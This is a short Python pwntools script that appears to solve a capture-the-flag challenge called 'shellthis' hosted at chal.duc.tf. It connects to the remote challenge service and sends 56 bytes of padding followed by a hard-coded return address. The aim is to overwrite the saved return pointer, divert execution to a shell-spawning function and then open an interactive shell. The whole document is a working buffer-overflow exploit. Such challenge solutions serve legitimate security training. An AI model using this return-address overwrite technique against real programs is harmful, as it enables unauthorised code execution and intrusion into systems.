from pwn import *

context.terminal = ["tmux", "splitw", "-v"]
context.log_level = 'DEBUG'
#for local
#sh = gdb.debug("./shellthis")
#for remote
sh = remote("chal.duc.tf", 30002)
shell = p64(0x004006ca)
padding = b'a'*56
payload = padding + shell
sh.sendlineafter("name: ",payload)
sh.interactive()
